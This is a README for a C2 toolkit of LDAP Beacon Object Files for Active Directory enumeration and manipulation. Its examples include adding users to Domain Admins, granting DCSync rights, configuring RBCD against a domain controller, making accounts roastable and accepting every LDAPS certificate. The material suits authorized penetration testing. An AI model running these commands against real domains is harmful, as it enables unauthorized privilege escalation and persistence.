# LDAP BOF Collection

## Authors Note

Hello~ This marks the end of a fairly long journey. For a long time I've felt that I was over-reliant on socks proxies to be able to perform a lot of AD enumeration and privesc tasks. ldapsearch can only get you so far. One of my favorite tools as of late is bloodyAD, so I sought out to replicate most of its functionality in the form of bofs. Usually I'm not very happy with the results of my projects, but despite the amount of time sank into this one I think it turned out okay.

There are still a few issues, for example: `get-object` will show jumbled characters for the SID and GUID. Maybe I'll fix these someday, but not today. Also, yes, some of the readme is AI generated, though I did adjust a lot of it for accuracy. Also, yes, I know there's a lot of debug output.

### Description

Welcome to my ldap bof collection! Filled with many bofs of varying quality and usefulness, I'm sure you'll find whatever you need right here. This project was created for use with the Adaptix C2, and has a mapping file which registers commands under the `ldap` prefix. To see usage for any command, run `help ldap {command}`. That being said, any C2 with any agent capable of running bofs and passing arguments to them should be capable of running these.

**Key Features:**
- **40+ BOF commands** for comprehensive AD operations
- **LDAPS support** (port 636) with automatic certificate acceptance
- **Standard LDAP** (port 389) with signing and sealing
- **Automatic DN/username detection** for flexible targeting
- **Attack macros** for common exploitation scenarios
- **Adaptix C2 integration** via AxScript command definitions

For full content and guidance, see the command reference.

## Requirements

- **Adaptix C2 Framework**
- **Windows x64 target** (BOFs compiled for x64 architecture)
- **Authenticated domain context** (commands execute as current user)
- **MinGW-w64 cross-compiler** (for building from source)

## Installation

1. Clone the repository:
```bash
git clone https://github.com/P0142/ldap-bof-collection.git
cd ldap-bof-collection
```

2. Build from source:
```bash
make
```

3. Load the toolkit in Adaptix C2:
- AxScript tab -> Script Manager -> Right click, Load New
- The `ldap.axs` AxScript file will automatically register all commands
- Commands are available under the `ldap` namespace

## Command Reference

### View Usage

```bash
help ldap {command}
```

### Enumeration Commands (GET)

| Command | Description | Usage Example |
|---------|-------------|---------------|
| `get-users` | List all domain users | `ldap get-users [-ou {path}] [-dc {ip}] [--ldaps]` |
| `get-computers` | List all domain computers | `ldap get-computers [-ou {path}] [-dc {ip}] [--ldaps]` |
| `get-groups` | List all domain groups | `ldap get-groups [-ou {path}] [-dc {ip}] [--ldaps]` |
| `get-usergroups` | List groups a user belongs to | `ldap get-usergroups {user} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `get-groupmembers` | List members of a group | `ldap get-groupmembers {group} [-ou {path}] [-dc {ip}]` |
| `get-object` | Dump all attributes of an object | `ldap get-object {target} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `get-maq` | Get the machine account quota | `ldap get-maq [-dc {ip}] [--ldaps]` |
| `get-domaininfo` | Query domain information from rootDSE | `ldap get-domaininfo [-dc {ip}] [--ldaps]` |
| `get-writable` | Find objects with write access | `ldap get-writable [-ou {path}] [-dc {ip}] [--ldaps] [--detailed]` |
| `get-delegation` | View delegation configuration | `ldap get-delegation {target} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `get-uac` | View UserAccountControl flags | `ldap get-uac {target} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `get-attribute` | Read specific LDAP attribute | `ldap get-attribute {target} {attribute} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `get-spn` | List ServicePrincipalNames | `ldap get-spn {target} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `get-acl` | View object DACL/ACEs | `ldap get-acl {target} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `get-rbcd` | View Resource-Based Constrained Delegation | `ldap get-rbcd {target} [-ou {path}] [-dc {ip}] [--ldaps]` |

### Creation Commands (ADD)

| Command | Description | Usage Example |
|---------|-------------|---------------|
| `add-user` | Create a new user object | `ldap add-user {username} {password} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `add-computer` | Create a new computer object | `ldap add-computer {computer} [-p {password}] [-ou {ou_path}] [-dc {dc_address}] [--disabled] [--ldaps]` |
| `add-group` | Create a new group | `ldap add-group {name} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `add-groupmember` | Add user to group | `ldap add-groupmember {group} {member} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `add-ou` | Create organizational unit | `ldap add-ou {name} [-parent {path}] [-dc {ip}] [--ldaps]` |
| `add-sidhistory` | Add SID to sidHistory | `ldap add-sidhistory {target} {sid} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `add-spn` | Add ServicePrincipalName | `ldap add-spn {target} {spn} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `add-attribute` | Add/append attribute value | `ldap add-attribute {target} {attr} {value} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `add-uac` | Add UserAccountControl flag | `ldap add-uac {target} {flag} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `add-delegation` | Set/replace delegation SPNs | `ldap add-delegation {target} {spn} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `add-ace` | Add ACE to object DACL | `ldap add-ace {target} {trustee} [-rights {rights}] [-type {type}] [options]` |
| `add-rbcd` | Configure RBCD delegation | `ldap add-rbcd {target} {delegated} [-ou {path}] [-dc {ip}] [--ldaps]` |

### Modification Commands (SET)

| Command | Description | Usage Example |
|---------|-------------|---------------|
| `set-password` | Change user password | `ldap set-password {user} {newpass} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `set-spn` | Replace all SPNs | `ldap set-spn {target} {spn} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `set-delegation` | Replace delegation config | `ldap set-delegation {target} {spn} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `set-attribute` | Replace attribute value | `ldap set-attribute {target} {attr} {value} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `set-uac` | Set UAC flags (replace) | `ldap set-uac {target} {flags} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `set-owner` | Change object owner | `ldap set-owner {target} {owner} [-ou {path}] [-dc {ip}] [--ldaps]` |

### Other Commands

| Command | Description | Usage Example |
|---------|-------------|---------------|
| `move-object` | Move object to different OU | `ldap move-object {target} {dest_ou} [-ou {path}] [-dc {ip}] [--ldaps]` |

### Removal Commands (REMOVE)

| Command | Description | Usage Example |
|---------|-------------|---------------|
| `remove-groupmember` | Remove user from group | `ldap remove-groupmember {group} {member} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `remove-object` | Delete AD object | `ldap remove-object {target} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `remove-delegation` | Clear delegation SPNs | `ldap remove-delegation {target} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `remove-spn` | Remove specific SPN | `ldap remove-spn {target} {spn} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `remove-attribute` | Remove attribute value | `ldap remove-attribute {target} {attr} {value} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `remove-ace` | Remove ACE from DACL | `ldap remove-ace {target} [-trustee {trustee}] [-index {idx}] [options]` |
| `remove-rbcd` | Clear RBCD configuration | `ldap remove-rbcd {target} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `remove-uac` | Remove UAC flag | `ldap remove-uac {target} {flag} [-ou {path}] [-dc {ip}] [--ldaps]` |

### Attack Macros

These macros simplify common AD exploitation techniques by wrapping multiple operations:

| Macro | Description | Usage Example |
|-------|-------------|---------------|
| `add-genericall` | Grant GenericAll rights | `ldap add-genericall {target} {trustee} [options]` |
| `add-genericwrite` | Grant GenericWrite rights | `ldap add-genericwrite {target} {trustee} [options]` |
| `add-asreproastable` | Make user AS-REP roastable | `ldap add-asreproastable {user} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `add-dcsync` | Grant DCSync permissions | `ldap add-dcsync {target} {trustee} [options]` |
| `add-unconstrained` | Enable unconstrained delegation | `ldap add-unconstrained {target} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `add-constrained` | Configure constrained delegation | `ldap add-constrained {target} {spn} [-ou {path}] [-dc {ip}] [--ldaps]` |
| `remove-genericall` | Remove GenericAll ACE | `ldap remove-genericall {target} {trustee} [options]` |
| `remove-genericwrite` | Remove GenericWrite ACE | `ldap remove-genericwrite {target} {trustee} [options]` |
| `remove-dcsync` | Remove DCSync permissions | `ldap remove-dcsync {target} {trustee} [options]` |

## Usage Examples

### Basic Enumeration
```bash
# List all domain users
ldap get-users

# List computers in specific OU
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"

# Query user's group memberships
ldap get-usergroups jane.doe

# Find objects you can modify
ldap get-writable --detailed
```

### User/Computer Creation
```bash
# Create new user
ldap add-user jane.doe Password123!

# Create computer account
ldap add-computer TESTCOMP -p Password123!

# Add user to Domain Admins
ldap add-groupmember "Domain Admins" jane.doe
```

### Password & Attribute Manipulation
```bash
# Change user password
ldap set-password targetuser Password123!

# Make user kerberoastable
ldap add-spn targetuser HTTP/fake.service

# Make user AS-REP roastable
ldap add-asreproastable targetuser
```

### Delegation Attacks
```bash
# Configure unconstrained delegation
ldap add-unconstrained WS01$

# Configure constrained delegation
ldap add-constrained WS02$ CIFS/DC01.corp.local

# Configure RBCD
ldap add-rbcd DC01$ ATTACKER$
```

### ACL/Permission Manipulation
```bash
# View object's ACL
ldap get-acl "CN=AdminUser,CN=Users,DC=corp,DC=local"

# Grant DCSync rights
ldap add-dcsync "DC=corp,DC=local" eviluser

# Grant GenericAll on user
ldap add-genericall targetuser attackeruser

# Remove specific ACE
ldap remove-ace targetuser -index 5
```

### LDAPS Usage
```bash
# Use LDAPS (port 636) for sensitive operations
ldap set-password targetuser NewP@ss789 --ldaps
ldap add-user secretuser P@ss123 --ldaps
```

### Targeting Specific DC
```bash
# Target specific domain controller
ldap get-users -dc 192.168.1.10
ldap add-groupmember "Domain Admins" attacker -dc 192.168.1.10
```

## Architecture

### Project Structure
```
ldap-bof-collection/
├── ldap.axs              # AxScript command definitions for Adaptix C2
├── Makefile              # Build configuration
├── _bin/                 # Compiled BOF object files (x64)
├── _include/             # Shared header files
│   ├── beacon.h          # BOF API definitions
│   ├── ldap_common.h     # LDAP utility declarations
│   └── acl_common.h      # ACL/security utility declarations
└── src/
    ├── common/           # Shared implementation files
    │   ├── ldap_common.c # LDAP connection and query functions
    │   └── acl_common.c  # ACL/SID manipulation functions
    ├── get/              # Enumeration BOFs
    ├── add/              # Creation/addition BOFs
    ├── set/              # Modification BOFs
    ├── move/             # Move operation BOFs
    └── remove/           # Deletion/removal BOFs
```

## Building from Source

### Prerequisites
```bash
# Install MinGW-w64 cross-compiler
# Arch:
sudo pacman -S mingw-w64-gcc mingw-w64-headers
```

### Compilation
```bash
# Build all BOFs
make

# Clean build artifacts
make clean
```

## Technical Details

### Authentication
All LDAP operations use the current beacon's security context. The toolkit automatically:
- Retrieves current user credentials
- Establishes authenticated LDAP binds
- Negotiates signing/sealing for LDAP
- Handles LDAPS certificate validation (accepts all)

Something I discovered in testing that may or may not be relevant to you: 

For some reason when acting on agents linked to eachother via smb or tcp tickets and tokens will stop working. I have not been able to find a solution, even after using `klist purge` and `rev2self` the agent still has issues when using bofs that need to operate in the context of the session.

### DN vs Username Detection
Commands automatically detect input format:
- **Distinguished Names** - Match pattern: `CN=...,DC=...`
- **Usernames** - Simple alphanumeric strings
- Automatic search and conversion when needed

### LDAPS Certificate Handling
The toolkit includes a permissive certificate callback that accepts all server certificates, useful for environments with self-signed certificates or certificate mismatches.

### Common Permissions Required
- **User/Computer Creation** - Write access to target OU, may require specific extended rights
- **Group Modifications** - Write access to group object
- **Password Changes** - "Reset Password" or "Change Password" rights
- **ACL Modifications** - WriteDACL permission on target object
- **Delegation** - Write to `msDS-AllowedToActOnBehalfOfOtherIdentity` or `userAccountControl`

## Troubleshooting

### Connection Issues
```bash
# Test basic connectivity
ldap get-domaininfo

# Try explicit DC specification
ldap get-domaininfo -dc 192.168.1.10

# Use LDAPS if port 389 is blocked
ldap get-domaininfo --ldaps
```

### Permission Errors
- Verify current user context: `whoami`
- Check object permissions: `ldap get-acl {target}`
- Use `ldap get-writable` to find modifiable objects

### Object Not Found
```bash
# Use distinguished name instead of username
ldap get-object "CN=jane.doe,CN=Users,DC=corp,DC=local"

# Specify search OU
ldap get-users -ou "OU=Employees,DC=corp,DC=local"
```

## Credits

#### [Adaptix C2](https://github.com/Adaptix-Framework/AdaptixC2)
#### [bloodyAD](https://github.com/CravateRouge/bloodyAD)

## Disclaimer

**FOR AUTHORIZED TESTING ONLY.** The author assumes no liability for misuse or damage caused by this toolkit. Always obtain proper authorization before conducting security assessments.
